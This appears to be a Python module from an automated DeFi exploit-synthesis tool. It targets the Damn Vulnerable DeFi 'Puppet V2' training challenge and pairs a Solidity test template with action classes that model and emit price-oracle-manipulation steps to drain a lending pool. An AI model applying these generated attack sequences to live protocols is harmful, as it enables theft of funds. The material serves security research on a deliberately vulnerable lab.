import time
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator
import os
import sys
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict
from Actions.Utils import *
from Actions.UtilsDVD import *  # DVD represents "Damn Vulnerable DeFi"
from Actions.UtilsPrecision import *


class puppetV2Action():
    initialStates = [100, 10, 1000000]
    globalStates = [100, 10, 1000000]
    # globalStates[0]: Uniswap DVT reserve
    # globalStates[1]: ETH reserve
    # globalStates[2]: PuppetPool reserve

    initialBalances = {"DVT": 10000, "ETH": 20}
    currentBalances = {"DVT": 10000, "ETH": 20}
    TargetTokens = {'ETH', 'DVT'}
    TokenPrices = {"WETH": 1000.0, "ETH": 1000.0, "DVT": 1.0}

    start_str = '''// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";

import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../Contracts/WETH9.sol";

import {PuppetV2Pool} from "../../../Contracts/puppet-v2/PuppetV2Pool.sol";
import {Strings} from "openzeppelin-contracts/utils/Strings.sol";


interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address);
    function getPair(address token0, address token1) external view returns (address);
}


interface UniswapV2Pair {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function initialize(address _token0, address _token1) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function getReserves() external view returns (uint112, uint112, uint32);
}


interface UniswapV2Router02 {
    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256, uint256, uint256);
    function swapExactTokensForETH(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory);
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable returns (uint256[] memory);
}





contract PuppetV2 is DSTest, stdCheats {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 20e18;

    // pool will start with 1_000_000 DVT
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    UniswapV2Pair internal uniswapV2Pair;
    UniswapV2Factory internal uniswapV2Factory;
    UniswapV2Router02 internal uniswapV2Router;

    DamnValuableToken internal dvt;
    WETH9 internal weth;

    PuppetV2Pool internal puppetV2Pool;
    address payable internal attacker;
    address payable internal deployer;

    string str1;
    string str2;
    string str3;
    string str89;
    string str90;
    string str91;

    uint ETHgot;
    uint DVTasked;
    uint WETHneeded;
    address[] paths = new address[](2);


    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        deployer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
        );
        vm.label(deployer, "deployer");
        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE);


        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        weth = new WETH9();
        vm.label(address(weth), "WETH");



        // Deploy Uniswap Factory and Router
        uniswapV2Factory = UniswapV2Factory(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Factory.json", 
                abi.encode(address(0))
            )
        );

        uniswapV2Router = UniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );


        // Create Uniswap pair against WETH and add liquidity
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt),
            UNISWAP_INITIAL_TOKEN_RESERVE,              // amountTokenDesired
            0,                                          // amountTokenMin
            0,                                          // amountETHMin
            deployer,                                   // to
            DEADLINE                                    // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = UniswapV2Pair(
            uniswapV2Factory.getPair(address(dvt), address(weth))
        );

        assertEq(uniswapV2Pair.token0(), address(weth));
        assertEq(uniswapV2Pair.token1(), address(dvt));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Deploy the lending pool
        puppetV2Pool = new PuppetV2Pool(
            address(weth), 
            address(dvt), 
            address(uniswapV2Pair), 
            address(uniswapV2Factory)
        );


        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetV2Pool), POOL_INITIAL_TOKEN_BALANCE);


        // Ensure correct setup of pool.
        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );

        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE),
            300000 ether
        );

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        dvt.approve(address(uniswapV2Router), 2** 256 - 1);
        weth.approve(address(puppetV2Pool), 2** 256 - 1);

        paths[0] = address(dvt);
        paths[1] = address(weth);
        
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        return Strings.toString(_i);
    }
                
                
    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }
                
    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


    function UniswapSummary() internal returns (string memory _uintAsString) {
        (uint reserve0, uint reserve1, ) = uniswapV2Pair.getReserves();
        str1 = appendWithSpace("DVT balance: ", uint2str(reserve1 / 10 ** 18));
        str2 = appendWithSpace("WETH balance: ", uint2str(reserve0 / 10 ** 18));
        return appendWithSpace(str1, str2);
    }


    function puppetPoolSummary() public returns  (string memory _uintAsString){
        uint balance = dvt.balanceOf(address(puppetV2Pool)) / 10 ** 18;
        return appendWithSpace("DVT reserve: ", uint2str(balance));
    }

    function ProfitSummary() public returns  (string memory _uintAsString){
        uint balance = dvt.balanceOf(attacker) / 10 ** 18;
        uint balance2 = address(attacker).balance / 10 ** 18;
        uint balance3 = weth.balanceOf(attacker) / 10 ** 18;
        str1 = appendWithSpace("DVT balance: ", uint2str(balance));
        str2 = appendWithSpace("ETH balance: ", uint2str(balance2));
        str3 = appendWithSpace("WETH balance: ", uint2str(balance3));

        return appendWithSpace(str1, appendWithSpace( str2 , str3)); 


        // original balances:
        // Uniswap V1: 10 DVT  10 WETH
        // attacker: 10_000 DVT  20 ETH
        // puppetPool: 1000_000 DVT
        // 1 ether = 1000 DVT
        // Try to get as many DVT as possible while keeping ETH as much as possible 
    }




    '''

    attack_str = ""
    collector_str = ""

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        # print(stats)
        if stats == None or len(stats) != 3:
            return 0
        DVT_earned = stats[0] - puppetV2Action.initialBalances['DVT']
        ETH_earned = stats[1] - puppetV2Action.initialBalances['ETH']
        WETH_earned = stats[2]

        return DVT_earned + ETH_earned * 1000.0 + WETH_earned * 1000.0

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit


    @classmethod
    def buildAttackContract(cls, ActionList):
        cls.attack_str = buildDVDattackContract(
            ActionList) + "       revert(ProfitSummary());\n"
        return cls.attack_str

    @classmethod
    def buildCollectorContract(cls, ActionList):
        cls.collector_str = buildDVDCollectorContract(ActionList)
        return cls.collector_str

    def ToString(ActionList):
        return ToString(ActionList)



class SwapUniswapDVT2ETH_V2(puppetV2Action):

    numInputs = 1
    tokensIn = ['DVT']
    tokensOut = ['ETH']
    range = [0, 20000]

    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapDVT2ETH_V2\n"
        action += '''       paths[0] = address(dvt);
        paths[1] = address(weth);
        uniswapV2Router.swapExactTokensForETH($$ ether, 0, paths, attacker, DEADLINE);\n'''
        return action

    @classmethod
    def simulate(cls, input):
        input_amount_with_fee = input * 997
        numerator = input_amount_with_fee * cls.globalStates[1]
        denominator = (cls.globalStates[0] * 1000) + input_amount_with_fee
        output = numerator / denominator
        return cls.globalStates[0] + input, cls.globalStates[1] - output, output


    @classmethod
    def transit(cls, input):
        puppetV2Action.currentBalances["DVT"] -= input

        output0, output1, output2 = cls.simulate(input)

        puppetV2Action.globalStates[0] = output0
        puppetV2Action.globalStates[1] = output1
        puppetV2Action.currentBalances["ETH"] += output2
        return

    @classmethod
    def string(cls):
        return cls.__name__

class WrapETH(puppetV2Action):

    numInputs = 1
    tokensIn = ['ETH']
    tokensOut = ['WETH']
    range = [0, int(30)]

    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapDVT2ETH\n"
        action += '''       weth.deposit{value: $$ * 10 ** 18}();\n'''
        return action

    @classmethod
    def transit(cls, input):
        cls.currentBalances["ETH"] -= input
        if "WETH" not in cls.currentBalances:
            cls.currentBalances["WETH"] = 0
        cls.currentBalances["WETH"] += input
        return

    @classmethod
    def string(cls):
        return cls.__name__

class PoolBorrow_V2(puppetV2Action):
    numInputs = 1
    tokensIn = ['WETH']
    tokensOut = ['DVT']
    range = [0, int(1000000)]

    @classmethod
    def actionStr(cls):
        action = "      // Action: PoolBorrow_V2\n"
        action += '''       DVTasked = $$e18;\n'''
        action += '''       puppetV2Pool.borrow( DVTasked );\n'''
        return action


    @classmethod
    def simulate(cls, input):
        tokenAmount = input
        _getOracleQuote = tokenAmount * cls.globalStates[1] / cls.globalStates[0]
        DepositOfWETHRequired = _getOracleQuote * 3
        return 0, DepositOfWETHRequired

    @classmethod
    def transit(cls, input):
        cls.currentBalances["DVT"] += input

        output0, output1 = cls.simulate(input)


        cls.globalStates[2] -= input
        cls.currentBalances["WETH"] -= output1
        return

    @classmethod
    def string(cls):
        return cls.__name__


class SwapUniswapETH2DVT_V2(puppetV2Action):

    numInputs = 1
    tokensIn = ['ETH']
    tokensOut = ['DVT']
    range = [0, 30]

    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapETH2DVT_V2\n"
        action += '''       paths[0] = address(weth);
        paths[1] = address(dvt);
        uniswapV2Router.swapExactETHForTokens{value: $$ ether}(0, paths, attacker, DEADLINE);\n'''
        return action

    @classmethod
    def simulate(cls, input):
        input_amount_with_fee = input * 997
        numerator = input_amount_with_fee * cls.globalStates[0]
        denominator = (cls.globalStates[1] * 1000) + input_amount_with_fee
        output = numerator / denominator
        return cls.globalStates[0] - output, cls.globalStates[1] + input, output


    @classmethod
    def transit(cls, input):
        puppetV2Action.currentBalances["ETH"] -= input

        output0, output1, output2 = cls.simulate(input)

        puppetV2Action.globalStates[0] = output0
        puppetV2Action.globalStates[1] = output1
        puppetV2Action.currentBalances["DVT"] += output2
        return

    @classmethod
    def string(cls):
        return cls.__name__




def main():
    # config.method
    # config.contract_name
    # config.initialEther
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 1
    config.ETHorBSCorDVDorFantom = 2  # 0 for ETH, 1 for BSC, 2 for DVD


    action1 = SwapUniswapDVT2ETH_V2
    action2 = WrapETH
    action3 = PoolBorrow_V2

    ActionWrapper = puppetV2Action
    action_list = [action1, action2, action3]
    initial_guess = [10000, 29, 983100]

    print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    actual_profit = 953100.0
    print("actual profit: ", actual_profit)
    estimate_profit = getEstimatedProfit_precise_display(initial_guess, ActionWrapper, action_list, True)
    print("estimated profit: ", estimate_profit)
    return actual_profit, estimate_profit




if __name__ == "__main__":
    main()
    